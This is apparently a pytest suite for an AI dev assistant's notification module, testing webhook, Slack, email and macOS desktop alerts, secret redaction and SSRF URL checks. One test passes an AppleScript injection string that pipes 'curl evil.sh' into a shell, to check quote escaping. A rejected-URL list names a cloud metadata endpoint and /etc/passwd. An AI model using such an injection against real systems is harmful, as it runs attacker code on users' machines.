"""Offline tests for src/ai_dev_assistant/notify.py.

No network, no real desktop banners: the webhook transport is injected and
subprocess.run is monkeypatched.
"""

from __future__ import annotations

import json
import subprocess
import sys

import pytest

from ai_dev_assistant import notify
from ai_dev_assistant.notify import (
    NotifyConfig,
    notify_event,
    redact_for_notification,
    should_notify,
)

IS_DARWIN = sys.platform == "darwin"


# ---------------------------------------------------------------- from_env

class TestFromEnv:
    def test_defaults_when_unset(self, monkeypatch):
        for var in ("ADA_NOTIFY_WEBHOOK", "ADA_NOTIFY_DESKTOP", "ADA_NOTIFY_EVENTS"):
            monkeypatch.delenv(var, raising=False)
        cfg = NotifyConfig.from_env()
        assert cfg.webhook_url == ""
        assert cfg.desktop is False
        assert cfg.events == ("ask", "permission", "done", "error")

    def test_reads_webhook_and_events_csv(self, monkeypatch):
        monkeypatch.setenv("ADA_NOTIFY_WEBHOOK", "https://hooks.example.com/x")
        monkeypatch.setenv("ADA_NOTIFY_EVENTS", " Ask , error ,, DONE ")
        cfg = NotifyConfig.from_env()
        assert cfg.webhook_url == "https://hooks.example.com/x"
        assert cfg.events == ("ask", "error", "done")  # trimmed, lowered, no blanks

    def test_empty_events_csv_falls_back_to_defaults(self, monkeypatch):
        monkeypatch.setenv("ADA_NOTIFY_EVENTS", " , ,")
        cfg = NotifyConfig.from_env()
        assert cfg.events == ("ask", "permission", "done", "error")

    @pytest.mark.parametrize("raw,expected", [
        ("1", True), ("true", True), ("YES", True), ("on", True),
        ("0", False), ("false", False), ("", False), ("banana", False),
    ])
    def test_desktop_truthy_parsing_on_darwin(self, monkeypatch, raw, expected):
        monkeypatch.setattr(notify.sys, "platform", "darwin")
        monkeypatch.setenv("ADA_NOTIFY_DESKTOP", raw)
        assert NotifyConfig.from_env().desktop is expected

    def test_desktop_auto_false_off_darwin(self, monkeypatch):
        monkeypatch.setattr(notify.sys, "platform", "linux")
        monkeypatch.setenv("ADA_NOTIFY_DESKTOP", "1")
        assert NotifyConfig.from_env().desktop is False

    def test_slack_and_email_defaults_when_unset(self, monkeypatch):
        for var in ("ADA_NOTIFY_SLACK_WEBHOOK", "ADA_NOTIFY_EMAIL_TO",
                    "ADA_NOTIFY_SMTP_HOST", "ADA_NOTIFY_SMTP_PORT",
                    "ADA_NOTIFY_SMTP_USER", "ADA_NOTIFY_SMTP_STARTTLS"):
            monkeypatch.delenv(var, raising=False)
        cfg = NotifyConfig.from_env()
        assert cfg.slack_webhook_url == ""
        assert cfg.email_to == "" and cfg.smtp_host == "" and cfg.smtp_user == ""
        assert cfg.smtp_port == 587
        assert cfg.smtp_starttls is True

    def test_reads_slack_and_email_settings(self, monkeypatch):
        monkeypatch.setenv("ADA_NOTIFY_SLACK_WEBHOOK",
                           "https://hooks.slack.com/services/T/B/C")
        monkeypatch.setenv("ADA_NOTIFY_EMAIL_TO", "ops@example.com")
        monkeypatch.setenv("ADA_NOTIFY_SMTP_HOST", "smtp.example.com")
        monkeypatch.setenv("ADA_NOTIFY_SMTP_PORT", "2525")
        monkeypatch.setenv("ADA_NOTIFY_SMTP_USER", "ada@example.com")
        monkeypatch.setenv("ADA_NOTIFY_SMTP_STARTTLS", "0")
        cfg = NotifyConfig.from_env()
        assert cfg.slack_webhook_url == "https://hooks.slack.com/services/T/B/C"
        assert cfg.email_to == "ops@example.com"
        assert cfg.smtp_host == "smtp.example.com"
        assert cfg.smtp_port == 2525
        assert cfg.smtp_user == "ada@example.com"
        assert cfg.smtp_starttls is False

    def test_bad_smtp_port_falls_back_to_default(self, monkeypatch):
        monkeypatch.setenv("ADA_NOTIFY_SMTP_PORT", "banana")
        assert NotifyConfig.from_env().smtp_port == 587


# ---------------------------------------------------------- should_notify

class TestShouldNotify:
    def test_listed_event_passes(self):
        cfg = NotifyConfig(events=("ask", "done"))
        assert should_notify(cfg, "ask") is True
        assert should_notify(cfg, "done") is True

    def test_unlisted_event_filtered(self):
        cfg = NotifyConfig(events=("ask", "done"))
        assert should_notify(cfg, "status") is False
        assert should_notify(cfg, "permission") is False

    def test_notify_event_skips_filtered_types(self):
        calls = []
        cfg = NotifyConfig(webhook_url="https://hooks.example.com/x",
                           events=("done",))
        fired = notify_event(cfg, event_type="status", task_id="t1", project="p",
                             message="m", transport=lambda *a: calls.append(a))
        assert fired is False
        assert calls == []


# ------------------------------------------------------------------ webhook

def _capture_transport(calls):
    def transport(url, payload, headers):
        calls.append((url, payload, headers))
    return transport


class TestWebhook:
    def test_payload_shape_and_transport_injection(self):
        calls = []
        cfg = NotifyConfig(webhook_url="https://hooks.example.com/notify")
        fired = notify_event(
            cfg, event_type="ask", task_id="task-42", project="myproj",
            message="Which database?", data={"agent": "coder", "id": "r1"},
            transport=_capture_transport(calls),
        )
        assert fired is True
        assert len(calls) == 1
        url, payload, headers = calls[0]
        assert url == "https://hooks.example.com/notify"
        assert headers["Content-Type"] == "application/json"
        body = json.loads(payload.decode("utf-8"))
        assert body["event"] == "ask"
        assert body["task_id"] == "task-42"
        assert body["project"] == "myproj"
        assert body["message"] == "Which database?"
        assert isinstance(body["ts"], float)
        assert body["data"] == {"agent": "coder", "id": "r1"}

    def test_message_is_redacted(self):
        calls = []
        cfg = NotifyConfig(webhook_url="https://hooks.example.com/x")
        notify_event(cfg, event_type="error", task_id="t", project="p",
                     message="failed with key sk-ant-abc123456789 attached",
                     transport=_capture_transport(calls))
        body = json.loads(calls[0][1].decode("utf-8"))
        assert "sk-ant-" not in body["message"]
        assert "«redacted-secret»" in body["message"]

    def test_data_is_slimmed(self):
        calls = []
        cfg = NotifyConfig(webhook_url="https://hooks.example.com/x")
        notify_event(
            cfg, event_type="done", task_id="t", project="p", message="done",
            data={
                "passed": 3,
                "total": 3,
                "output": "huge result body " * 100,   # body-ish key: dropped
                "diff": "--- a/x\n+++ b/x",            # body-ish key: dropped
                "nested": {"deep": "structure"},       # container: dropped
                "note": "token=abcdef123456789012 " + "x" * 500,
            },
            transport=_capture_transport(calls),
        )
        body = json.loads(calls[0][1].decode("utf-8"))
        data = body["data"]
        assert data["passed"] == 3 and data["total"] == 3
        assert "output" not in data and "diff" not in data and "nested" not in data
        assert "abcdef123456789012" not in data["note"]   # redacted
        assert len(data["note"]) <= 200                   # truncated

    def test_transport_failure_returns_false(self):
        def failing(url, payload, headers):
            raise OSError("connection refused")
        cfg = NotifyConfig(webhook_url="https://hooks.example.com/x")
        assert notify_event(cfg, event_type="done", task_id="t", project="p",
                            message="m", transport=failing) is False

    def test_no_webhook_configured_returns_false(self):
        cfg = NotifyConfig()  # no channels at all
        assert notify_event(cfg, event_type="done", task_id="t", project="p",
                            message="m", transport=_capture_transport([])) is False


# -------------------------------------------------------------------- slack

class TestSlack:
    SLACK_URL = "https://hooks.slack.com/services/T000/B000/xyz"

    def test_payload_is_slack_shaped(self):
        calls = []
        cfg = NotifyConfig(slack_webhook_url=self.SLACK_URL)
        fired = notify_event(
            cfg, event_type="ask", task_id="task-42", project="myproj",
            message="Which database?", data={"url": "https://ada.example.com/run/42"},
            transport=_capture_transport(calls),
        )
        assert fired is True
        assert len(calls) == 1
        url, payload, headers = calls[0]
        assert url == self.SLACK_URL
        assert headers["Content-Type"] == "application/json"
        body = json.loads(payload.decode("utf-8"))
        # Slack shape, not the generic ping shape
        assert set(body) == {"text", "blocks"}
        assert body["text"] == "[myproj] ask: Which database?"
        section, context = body["blocks"]
        assert section["type"] == "section"
        assert section["text"]["text"] == body["text"]
        assert context["type"] == "context"
        ctx_text = context["elements"][0]["text"]
        assert "event: ask" in ctx_text
        assert "project: myproj" in ctx_text
        assert "<https://ada.example.com/run/42>" in ctx_text  # link included

    def test_no_link_in_context_when_data_has_none(self):
        calls = []
        cfg = NotifyConfig(slack_webhook_url=self.SLACK_URL)
        notify_event(cfg, event_type="done", task_id="t", project="p", message="ok",
                     transport=_capture_transport(calls))
        ctx_text = json.loads(calls[0][1])["blocks"][1]["elements"][0]["text"]
        assert "<" not in ctx_text

    def test_slack_text_is_redacted(self):
        calls = []
        cfg = NotifyConfig(slack_webhook_url=self.SLACK_URL)
        notify_event(cfg, event_type="error", task_id="t", project="p",
                     message="boom with sk-ant-abc123456789 inside",
                     transport=_capture_transport(calls))
        body = json.loads(calls[0][1].decode("utf-8"))
        assert "sk-ant-" not in json.dumps(body)
        assert "«redacted-secret»" in body["text"]

    def test_slack_url_goes_through_ssrf_guard(self):
        calls = []
        cfg = NotifyConfig(slack_webhook_url="http://169.254.169.254/latest")
        fired = notify_event(cfg, event_type="done", task_id="t", project="p",
                             message="m", transport=_capture_transport(calls))
        assert fired is False
        assert calls == []

    def test_generic_and_slack_both_fire(self):
        calls = []
        cfg = NotifyConfig(webhook_url="https://hooks.example.com/x",
                           slack_webhook_url=self.SLACK_URL)
        assert notify_event(cfg, event_type="done", task_id="t", project="p",
                            message="m", transport=_capture_transport(calls)) is True
        assert [c[0] for c in calls] == ["https://hooks.example.com/x", self.SLACK_URL]
        generic = json.loads(calls[0][1])
        slack = json.loads(calls[1][1])
        assert "task_id" in generic and "task_id" not in slack

    def test_disabled_when_unset(self):
        calls = []
        cfg = NotifyConfig(webhook_url="https://hooks.example.com/x")  # no slack
        notify_event(cfg, event_type="done", task_id="t", project="p", message="m",
                     transport=_capture_transport(calls))
        assert [c[0] for c in calls] == ["https://hooks.example.com/x"]

    def test_slack_transport_failure_returns_false(self):
        def failing(url, payload, headers):
            raise OSError("down")
        cfg = NotifyConfig(slack_webhook_url=self.SLACK_URL)
        assert notify_event(cfg, event_type="done", task_id="t", project="p",
                            message="m", transport=failing) is False


# -------------------------------------------------------------------- email

@pytest.fixture
def fake_smtp(monkeypatch):
    """Replace notify.smtplib.SMTP with a recorder; returns the instance list."""
    instances = []

    class FakeSMTP:
        def __init__(self, host, port, timeout=None):
            self.host, self.port, self.timeout = host, port, timeout
            self.calls = []
            instances.append(self)

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            self.calls.append(("close",))
            return False

        def starttls(self):
            self.calls.append(("starttls",))

        def login(self, user, password):
            self.calls.append(("login", user, password))

        def send_message(self, msg):
            self.calls.append(("send", msg))

    monkeypatch.setattr(notify.smtplib, "SMTP", FakeSMTP)
    return instances


EMAIL_CFG = dict(email_to="ops@example.com", smtp_host="smtp.example.com",
                 smtp_port=2525, smtp_user="ada@example.com")


class TestEmail:
    def test_full_send_flow_starttls_login_send(self, fake_smtp, monkeypatch):
        monkeypatch.setenv("ADA_SMTP_PASSWORD", "hunter2-smtp-pass")
        cfg = NotifyConfig(**EMAIL_CFG)
        fired = notify_event(cfg, event_type="done", task_id="task-9",
                             project="myproj", message="deps updated",
                             data={"passed": 3})
        assert fired is True
        assert len(fake_smtp) == 1
        smtp = fake_smtp[0]
        assert (smtp.host, smtp.port) == ("smtp.example.com", 2525)
        names = [c[0] for c in smtp.calls]
        assert names == ["starttls", "login", "send", "close"]  # tls BEFORE auth
        assert smtp.calls[1] == ("login", "ada@example.com", "hunter2-smtp-pass")
        msg = smtp.calls[2][1]
        assert msg["Subject"] == "[ada] done: deps updated"
        assert msg["To"] == "ops@example.com"
        assert msg["From"] == "ada@example.com"
        body = msg.get_content()
        assert "project: myproj" in body
        assert "task: task-9" in body
        assert "deps updated" in body
        assert "passed: 3" in body

    def test_subject_and_body_are_redacted(self, fake_smtp, monkeypatch):
        monkeypatch.setenv("ADA_SMTP_PASSWORD", "pw")
        cfg = NotifyConfig(**EMAIL_CFG)
        notify_event(cfg, event_type="error", task_id="t", project="p",
                     message="failed: sk-ant-abc123456789 leaked")
        msg = [c for c in fake_smtp[0].calls if c[0] == "send"][0][1]
        assert "sk-ant-" not in msg["Subject"]
        assert "sk-ant-" not in msg.get_content()
        assert "«redacted-secret»" in msg.get_content()

    def test_starttls_disabled(self, fake_smtp, monkeypatch):
        monkeypatch.setenv("ADA_SMTP_PASSWORD", "pw")
        cfg = NotifyConfig(smtp_starttls=False, **EMAIL_CFG)
        assert notify_event(cfg, event_type="done", task_id="t", project="p",
                            message="m") is True
        assert "starttls" not in [c[0] for c in fake_smtp[0].calls]

    def test_no_password_in_env_means_no_login(self, fake_smtp, monkeypatch):
        monkeypatch.delenv("ADA_SMTP_PASSWORD", raising=False)
        cfg = NotifyConfig(**EMAIL_CFG)
        assert notify_event(cfg, event_type="done", task_id="t", project="p",
                            message="m") is True  # open relay / already-authed host
        assert "login" not in [c[0] for c in fake_smtp[0].calls]

    def test_disabled_when_recipient_or_host_unset(self, fake_smtp):
        for cfg in (NotifyConfig(smtp_host="smtp.example.com"),   # no recipient
                    NotifyConfig(email_to="ops@example.com")):    # no host
            assert notify_event(cfg, event_type="done", task_id="t", project="p",
                                message="m") is False
        assert fake_smtp == []  # SMTP never even constructed

    def test_smtp_failure_returns_false_and_never_raises(self, monkeypatch):
        class ExplodingSMTP:
            def __init__(self, *a, **k):
                raise OSError("connect refused")

        monkeypatch.setattr(notify.smtplib, "SMTP", ExplodingSMTP)
        cfg = NotifyConfig(**EMAIL_CFG)
        assert notify_event(cfg, event_type="done", task_id="t", project="p",
                            message="m") is False

    def test_send_failure_after_connect_returns_false(self, fake_smtp, monkeypatch):
        monkeypatch.setenv("ADA_SMTP_PASSWORD", "pw")

        def boom(msg):
            raise OSError("rejected")

        cfg = NotifyConfig(**EMAIL_CFG)
        # patch send_message on the class the fixture installed
        monkeypatch.setattr(notify.smtplib.SMTP, "send_message", lambda self, m: boom(m))
        assert notify_event(cfg, event_type="done", task_id="t", project="p",
                            message="m") is False


# ----------------------------------------------------------- URL validation

class TestUrlValidation:
    @pytest.mark.parametrize("url", [
        "https://hooks.example.com/notify",
        "http://example.com/hook",
        "http://localhost:8080/hook",
        "http://127.0.0.1:9000/hook",
        "https://8.8.8.8/hook",           # public IP literal
    ])
    def test_allowed(self, url):
        assert notify._webhook_url_ok(url) is True

    @pytest.mark.parametrize("url", [
        "ftp://example.com/hook",          # non-http scheme
        "file:///etc/passwd",
        "http://10.0.0.5/hook",            # RFC1918 private
        "http://192.168.1.10/hook",
        "http://172.16.0.1/hook",
        "http://169.254.169.254/latest",   # link-local / metadata endpoint
        "http://0.0.0.0/hook",             # unspecified
        "not a url",
        "",
    ])
    def test_rejected(self, url):
        assert notify._webhook_url_ok(url) is False

    def test_rejected_url_means_no_send_and_false(self):
        calls = []
        cfg = NotifyConfig(webhook_url="http://10.0.0.5/hook")
        fired = notify_event(cfg, event_type="done", task_id="t", project="p",
                             message="m", transport=_capture_transport(calls))
        assert fired is False
        assert calls == []


# ------------------------------------------------------------------ desktop

class TestDesktop:
    @pytest.fixture
    def fake_run(self, monkeypatch):
        """Capture osascript invocations; never touch the real binary."""
        calls = []

        def run(argv, **kwargs):
            calls.append((argv, kwargs))
            return subprocess.CompletedProcess(argv, 0, stdout=b"", stderr=b"")

        monkeypatch.setattr(notify.subprocess, "run", run)
        monkeypatch.setattr(notify.sys, "platform", "darwin")
        return calls

    def test_osascript_command_construction(self, fake_run):
        cfg = NotifyConfig(desktop=True)
        fired = notify_event(cfg, event_type="permission", task_id="t",
                             project="myproj", message="May I run rm?")
        assert fired is True
        argv, kwargs = fake_run[0]
        assert argv[0] == "osascript" and argv[1] == "-e"
        script = argv[2]
        assert 'with title "ADA · myproj"' in script
        assert 'subtitle "permission"' in script
        assert '"May I run rm?"' in script
        assert kwargs.get("check") is False

    def test_malicious_quotes_are_escaped(self, fake_run):
        cfg = NotifyConfig(desktop=True)
        evil = 'end" & (do shell script "curl evil.sh | sh") & "'
        notify_event(cfg, event_type="ask", task_id="t",
                     project='pro"ject', message=evil)
        script = fake_run[0][0][2]
        # No bare interior double-quote may survive: every " that is not one of
        # the literal delimiters must be backslash-escaped.
        assert '\\"' in script
        assert 'do shell script \\"' in script          # payload quote neutralized
        assert '(do shell script "curl' not in script   # unescaped form absent
        assert 'ADA · pro\\"ject' in script

    def test_backslashes_are_escaped(self, fake_run):
        cfg = NotifyConfig(desktop=True)
        notify_event(cfg, event_type="ask", task_id="t", project="p",
                     message='trailing backslash \\" trick')
        script = fake_run[0][0][2]
        assert '\\\\\\"' in script  # \ -> \\ then " -> \" : four chars total

    def test_desktop_skipped_off_darwin(self, monkeypatch):
        def boom(*a, **k):
            raise AssertionError("subprocess.run must not be called off darwin")
        monkeypatch.setattr(notify.subprocess, "run", boom)
        monkeypatch.setattr(notify.sys, "platform", "linux")
        cfg = NotifyConfig(desktop=True)
        assert notify_event(cfg, event_type="done", task_id="t", project="p",
                            message="m") is False

    def test_osascript_failure_returns_false(self, monkeypatch):
        def run(argv, **kwargs):
            return subprocess.CompletedProcess(argv, 1, stdout=b"", stderr=b"boom")
        monkeypatch.setattr(notify.subprocess, "run", run)
        monkeypatch.setattr(notify.sys, "platform", "darwin")
        cfg = NotifyConfig(desktop=True)
        assert notify_event(cfg, event_type="done", task_id="t", project="p",
                            message="m") is False


# ------------------------------------------------------------- never raises

class TestNeverRaises:
    def test_exploding_transport_is_contained(self):
        class Boom(BaseException):
            """Nastier than Exception to prove per-channel containment of the
            common case; Exception-level blowups are the guarantee."""

        def exploding(url, payload, headers):
            raise RuntimeError("transport exploded")

        cfg = NotifyConfig(webhook_url="https://hooks.example.com/x")
        assert notify_event(cfg, event_type="done", task_id="t", project="p",
                            message="m", transport=exploding) is False

    def test_exploding_subprocess_is_contained(self, monkeypatch):
        def boom(*a, **k):
            raise RuntimeError("osascript exploded")
        monkeypatch.setattr(notify.subprocess, "run", boom)
        monkeypatch.setattr(notify.sys, "platform", "darwin")
        cfg = NotifyConfig(desktop=True)
        assert notify_event(cfg, event_type="done", task_id="t", project="p",
                            message="m") is False

    def test_unserializable_data_is_contained(self):
        # default=str in json.dumps handles odd scalars; even a hostile object
        # whose __str__ raises must not escape notify_event.
        class Hostile:
            def __str__(self):
                raise ValueError("no")

        calls = []
        cfg = NotifyConfig(webhook_url="https://hooks.example.com/x")
        fired = notify_event(cfg, event_type="done", task_id="t", project="p",
                             message="m", data={"passed": 1, "obj": Hostile()},
                             transport=_capture_transport(calls))
        # Hostile lives in a container-dropped slot (non-scalar) so it is slimmed
        # away and the send still succeeds.
        assert fired is True
        assert json.loads(calls[0][1])["data"] == {"passed": 1}

    def test_both_channels_fire_reports_true(self, monkeypatch):
        monkeypatch.setattr(notify.sys, "platform", "darwin")
        monkeypatch.setattr(
            notify.subprocess, "run",
            lambda argv, **k: subprocess.CompletedProcess(argv, 0, b"", b""))
        calls = []
        cfg = NotifyConfig(webhook_url="https://hooks.example.com/x", desktop=True)
        assert notify_event(cfg, event_type="ask", task_id="t", project="p",
                            message="m", transport=_capture_transport(calls)) is True
        assert len(calls) == 1

    def test_webhook_fails_but_desktop_fires_reports_true(self, monkeypatch):
        monkeypatch.setattr(notify.sys, "platform", "darwin")
        monkeypatch.setattr(
            notify.subprocess, "run",
            lambda argv, **k: subprocess.CompletedProcess(argv, 0, b"", b""))

        def failing(url, payload, headers):
            raise OSError("down")

        cfg = NotifyConfig(webhook_url="https://hooks.example.com/x", desktop=True)
        assert notify_event(cfg, event_type="ask", task_id="t", project="p",
                            message="m", transport=failing) is True


# ---------------------------------------------------------------- redaction

class TestRedaction:
    def test_reuses_security_redaction(self):
        out = redact_for_notification("ghp_abcdefghijklmnopqrstuv is the token")
        assert "ghp_" not in out
        assert "«redacted-secret»" in out

    def test_empty_and_none_safe(self):
        assert redact_for_notification("") == ""
        assert redact_for_notification(None) == ""  # type: ignore[arg-type]


# ---------------------------------------------------------------- spend alerts

def _capture(calls):
    def transport(url, payload, headers):
        calls.append((url, json.loads(payload.decode("utf-8")), headers))
    return transport


ALERT = {"type": "spend", "threshold": 0.8, "percent": 80, "spend_usd": 8.437,
         "monthly_cap": 10.0, "month": "2026-07", "window_days": 30}


class TestSpendAlerts:
    def test_format_spend_alert_snapshot(self):
        assert notify.format_spend_alert(ALERT) == (
            "Budget alert: 30-day spend $8.44 has crossed 80% of the "
            "$10.00 monthly cap (2026-07).")

    def test_format_spend_alert_tolerates_missing_fields(self):
        out = notify.format_spend_alert({})
        assert out.startswith("Budget alert:") and "$0.00" in out

    def test_notify_spend_alert_bypasses_event_filter(self):
        calls = []
        # Default events do NOT include spend_alert — the helper must still fire.
        cfg = NotifyConfig(webhook_url="https://hooks.example.com/x")
        assert notify.notify_spend_alert(cfg, ALERT, transport=_capture(calls)) is True
        assert len(calls) == 1
        _, payload, _ = calls[0]
        assert payload["event"] == "spend_alert"
        assert payload["project"] == "budget"
        assert payload["message"] == notify.format_spend_alert(ALERT)
        assert payload["data"]["threshold"] == 0.8
        assert payload["data"]["monthly_cap"] == 10.0

    def test_notify_spend_alert_never_raises(self):
        def boom(url, payload, headers):
            raise OSError("down")

        cfg = NotifyConfig(webhook_url="https://hooks.example.com/x")
        assert notify.notify_spend_alert(cfg, ALERT, transport=boom) is False
        assert notify.notify_spend_alert(NotifyConfig(), ALERT) is False  # no channels
